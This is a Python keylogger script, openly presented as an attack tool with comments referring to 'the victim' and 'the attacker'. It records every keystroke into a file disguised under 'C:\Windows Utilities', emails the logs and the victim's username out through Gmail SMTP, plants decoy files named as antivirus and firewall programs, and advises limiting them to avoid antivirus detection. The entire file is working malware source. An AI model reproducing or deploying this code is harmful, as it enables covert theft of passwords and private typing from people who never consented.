
#     _  __          _                             
#    | |/ /         | |                            
#    | ' / ___ _   _| | ___   __ _  __ _  ___ _ __ 
#    |  < / _ \ | | | |/ _ \ / _` |/ _` |/ _ \ '__|
#    | . \  __/ |_| | | (_) | (_| | (_| |  __/ |   
#    |_|\_\___|\__, |_|\___/ \__, |\__, |\___|_|   
#               __/ |         __/ | __/ |          
#              |___/         |___/ |___/           


#Importing the modules

#Importing keyboard
import keyboard
from keyboard import *

#Importing os
import os

#Importing SMTPlib
import smtplib

#Importing time and datetime
import time
import datetime

#Importing getpass
import getpass

#Taking name of the victim
name = getpass.getuser()

#Getting the time
time_date = datetime.datetime.now()
time_date = str(time_date)

#Some input needed from the attacker
your_email = "" #Enter email here
your_email_pass = "" #Enter password here

#Please make sure "LESS SECURE APPS" are enabled on the id provided

#Making a folder for storing the logs
Keylog_folder_path = "C:\\Windows Utilities"
if os.path.exists(Keylog_folder_path) != True :
	os.mkdir(Keylog_folder_path)

#Making the keylog files
Keylogs = os.path.join(Keylog_folder_path , "Screen Utilities.utility")
if os.path.exists(Keylogs) != True:
	file = open(Keylogs, "w")
	file.write("")
	file.close()
	#Send a confirmation mail
	sent_from = your_email
	to = your_email
	subject = "Keylogger activated on" +name + " 's computer"
	body =""
	email_text = """\
	From: %s
	To: %s
	Subject: %s

	%s
	""" % (sent_from, ", ".join(to), subject, body)
	
	server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
	server.ehlo()
	server.login(your_email, your_email_pass)
	server.sendmail(sent_from, to, email_text)
	server.close()
	
	
else: 
	#Reading the current logs
	Current_logs = open(Keylogs , "rb")
	Current_logs_message = Current_logs.read()
	Current_logs_message = str(Current_logs_message)
	Current_logs.close()
	#Mail the logs first
	
	sent_from = your_email
	to = your_email
	subject = "Keylogs of" + name + "at" + time_date
	body = Current_logs_message
   
	email_text = """\
	From: %s
	To: %s
	Subject: %s

	%s
	""" % (sent_from, ", ".join(to), subject, body)
	
	#Opening the SMTP server and sending the logs
	
	server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
	server.ehlo()
	server.login(your_email, your_email_pass)
	server.sendmail(sent_from, to, email_text)
	server.close()
	
	#Over-write the keylogs for next session
	Keylogs = str(Keylogs)
	file = open(Keylogs, "w")
	file.write("")
	file.close()
	



#Making some dummy files 
Dummy1 = os.path.join(Keylog_folder_path , "Anti Malware Executable.exe")
file = open(Dummy1, "w")
file.write("")  #Put some junk data to make it look like that the file really exists
file.close()
Dummy1 = os.path.join(Keylog_folder_path , "Screen saver.exe")
file = open(Dummy1, "w")
file.write("")  #Put some junk data to make it look like that the file really exists
file.close()
Dummy1 = os.path.join(Keylog_folder_path , "Keyboard Utilities.utilities")
file = open(Dummy1, "w")
file.write("")  #Put some junk data to make it look like that the file really exists
file.close()
Dummy1 = os.path.join(Keylog_folder_path , "Screen Utilities.utilities")
file = open(Dummy1, "w")
file.write("")  #Put some junk data to make it look like that the file really exists
file.close()
Dummy1 = os.path.join(Keylog_folder_path , "Mouse Utilities.utilities")
file = open(Dummy1, "w")
file.write("")  #Put some junk data to make it look like that the file really exists
file.close()
Dummy1 = os.path.join(Keylog_folder_path , "Network Manager.exe")
file = open(Dummy1, "w")
file.write("")  #Put some junk data to make it look like that the file really exists
file.close()
Dummy1 = os.path.join(Keylog_folder_path , "Firewall.exe")
file = open(Dummy1, "w")
file.write("")  #Put some junk data to make it look like that the file really exists
file.close()

#You can put more junk files if you want
#Dont put too much coz the anti virus might recognise its signature

#Function to call if a key is pressed
def onkeypress(e):
	key = e.name
	if key == "shift":
		key = "[shift]"
	elif key == "space":
		key = " "
	elif key == "alt":
		key = "[alt]"
	elif key == "caps lock":
		key = "[caps]"
	elif key == "backspace":
		key = "[backspace]"
	with open(Keylogs , "a+") as file2:
		file2.write(key)
		file2.close()
	
#Hooking into the keyboard
keyboard.on_release(onkeypress)

#Just an infinite loop to keep it running
a = 0
while True:
	a = a+1
    
    
    
    
#      __ __         __                      
#     / //_/__ __ __/ /__  ___ ____ ____ ____
#    / ,< / -_) // / / _ \/ _ `/ _ `/ -_) __/
#   /_/|_|\__/\_, /_/\___/\_, /\_, /\__/_/   
#            /___/       /___//___/          
